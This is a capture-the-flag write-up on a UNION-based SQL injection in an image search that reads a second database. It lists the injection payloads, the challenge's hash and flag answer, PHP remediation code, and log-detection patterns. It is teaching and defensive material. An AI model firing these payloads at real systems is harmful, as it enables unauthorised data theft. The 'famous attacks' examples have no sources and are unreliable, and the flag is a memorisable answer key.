# 🖼️💉 Image Search SQL Injection (Cross-Database Exploitation)

> **OWASP Category:** A03:2021 – Injection  
> **Severity:** 🔴 Critical  
> **Difficulty:** 🟡 Medium-High

The website's image search functionality contains a SQL injection vulnerability that allows attackers to perform cross-database queries and extract sensitive information from a separate image database (`Member_images.list_images`). This demonstrates how SQL injection can be leveraged to access multiple database systems and extract data across different application contexts.

🎯 **Cross-Database Carnage:** When SQL injection breaks down database boundaries - no data is safe!

---

## 🎯 Exploit Technique

### 🔧 Attack Evolution

#### 🥇 **Step 1 - Image Search SQL Injection Discovery**
```sql
-- Test basic injection in image search functionality
Input: 1 OR 1=1

-- Result: Reveals vulnerability exists in image search system
-- Different from previous member search injection
-- Indicates separate database or table structure
```

#### 🥈 **Step 2 - Cross-Database Schema Enumeration**
```sql
-- Discover tables across different databases
Input: 5 UNION SELECT table_name, table_schema FROM information_schema.tables

-- Key Discovery: Member_images database with list_images table
-- Identification of image-specific database separate from user data
-- Cross-database access confirmed possible
```

#### 🥉 **Step 3 - Image Database Structure Analysis**
```sql
-- Enumerate columns in image database
Input: 5 UNION SELECT column_name, table_name FROM information_schema.columns

-- Result: Member_images.list_images table contains 3 fields:
-- - title (image title/identifier)
-- - comment (description or metadata)
-- - [additional field - likely ID or path]
```

#### 🏆 **Step 4 - Cross-Database Data Extraction**
```sql
-- Extract sensitive data from image database
Input: 5 UNION SELECT title, comment FROM Member_images.list_images

-- Critical Discovery:
-- Title: If you read this just use this md5 decode lowercase then sha256 to win this flag! Good Luck!
-- Comment: 1928e8083cf461a51303633093573c46

-- Flag Recovery Process:
-- 1. MD5 decode: 1928e8083cf461a51303633093573c46
-- 2. Convert result to lowercase
-- 3. Apply SHA256 to get final flag
```

**Complete Attack Flow:**
1. 🔍 **Injection Discovery** - Identify SQL injection in image search
2. 🗄️ **Cross-Database Enum** - Map multiple database structures
3. 📊 **Schema Analysis** - Understand image database layout
4. 💎 **Data Extraction** - Retrieve hidden flag from image metadata
5. 🔓 **Hash Processing** - Decode MD5 → lowercase → SHA256
6. 🎉 **Flag Recovery** - Obtain final flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## 🛠️ Security Implementation

### ❌ vs ✅ Comparison

| 🚫 **Vulnerable Implementation** | ✅ **Secure Implementation** |
|--------------------------------|----------------------------|
| Multiple databases accessible via injection | Database access isolation |
| Cross-database queries allowed | Strict database permissions |
| Unfiltered search parameters | Parameterized queries |
| Sensitive data in image metadata | Separated data storage |

### 🔒 Defense Strategies

**Database Security Architecture:**
- [ ] **🔐 Database Isolation** - Separate databases with restricted access
- [ ] **👤 User Privilege Separation** - Different DB users for different functions
- [ ] **🚫 Cross-Database Restrictions** - Block inter-database queries
- [ ] **🛡️ Query Validation** - Strict input sanitization

**Application Security:**
- [ ] **📝 Parameterized Queries** - Use prepared statements always
- [ ] **🔍 Input Validation** - Whitelist allowed search parameters
- [ ] **🎭 Least Privilege** - Minimal database permissions per function
- [ ] **📊 Query Monitoring** - Log and analyze database queries

**Secure Implementation Example:**
```php
// Vulnerable Code - Direct query concatenation
$query = "SELECT * FROM images WHERE title LIKE '%$search%'";
$result = mysqli_query($connection, $query);

// Secure Code - Parameterized queries with access controls
$stmt = $pdo->prepare("SELECT id, title, thumbnail FROM images WHERE title LIKE ? AND status = 'public'");
$stmt->execute(['%' . $search . '%']);
$results = $stmt->fetchAll();

// Additional security: Restrict database access
// Use separate database user with limited permissions
// Grant only SELECT on specific tables
// REVOKE all cross-database access
```

---

## ⚠️ Risk Assessment & Impact

### 🎭 Attack Scenarios by Severity

| Risk Level | Attack Vector | Business Impact | Example |
|------------|---------------|----------------|---------|
| 🔴 **Critical** | Cross-database data extraction | Complete data breach | Access to all organizational databases |
| 🟠 **High** | Sensitive metadata exposure | Privacy violations | Personal information in image data |
| 🟡 **Medium** | Database structure disclosure | System reconnaissance | Architecture mapping for further attacks |
| 🟢 **Low** | Image catalog enumeration | Information disclosure | File structure and naming conventions |

### 📈 Famous Cross-Database Attacks

#### 🏆 Hall of Shame
- **🏥 Healthcare Network (2019)**  
  *Vulnerability:* Image search SQL injection  
  *Impact:* Patient photos and medical records accessed  
  *Method:* Cross-database queries via PACS system

- **🏢 Corporate Intranet (2020)**  
  *Vulnerability:* Document search injection  
  *Impact:* HR and financial databases compromised  
  *Vector:* UNION queries across multiple schemas

---

## 🧠 Security Mindset

### 💭 Key Principles

> 🔐 **Golden Rule #1:** "Every database connection is a potential breach point"

> 🗄️ **Golden Rule #2:** "Cross-database access should be strictly controlled"

> 🛡️ **Golden Rule #3:** "Assume attackers will discover all accessible data"

---

## 🚨 Detection & Monitoring

### 🔍 Warning Signs
- UNION queries targeting information_schema
- Cross-database table references in SQL injection attempts
- Attempts to access Member_images or similar databases
- Multiple database enumeration patterns

### 📊 Monitoring Implementation
```bash
# Monitor cross-database injection attempts
grep -E "(Member_images|information_schema|UNION.*SELECT)" /var/log/apache2/access.log

# Detect image search injection
awk '/image.*search/ && /(UNION|SELECT|OR.*=)/' /var/log/apache2/access.log
```

---

## 🛡️ Testing & Validation

### 🔧 Security Assessment Checklist
- [ ] Test all search fields for SQL injection
- [ ] Verify cross-database access restrictions
- [ ] Check information_schema access controls
- [ ] Test UNION-based injection in image search
- [ ] Validate database user privilege separation

### 🎯 Testing Methodology
```sql
-- Test basic injection in image search
searchterm: ' OR 1=1 --

-- Test UNION injection
searchterm: ' UNION SELECT user(), database() --

-- Test cross-database enumeration
searchterm: ' UNION SELECT table_schema, table_name FROM information_schema.tables --

-- Test specific table access
searchterm: ' UNION SELECT title, comment FROM Member_images.list_images --
```

---

## 🔗 Learning Resources

### 📚 Educational Materials
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [Multi-Database SQL Injection Techniques](https://portswigger.net/web-security/sql-injection)

### 🛠️ Practice Platforms
- **DVWA** - Multi-vector SQL injection challenges
- **SQLi Labs** - Cross-database injection scenarios
- **WebGoat** - Complex injection patterns

---

*Remember: Multiple injection points mean multiple opportunities for attackers - secure every input! 🖼️🔒* 
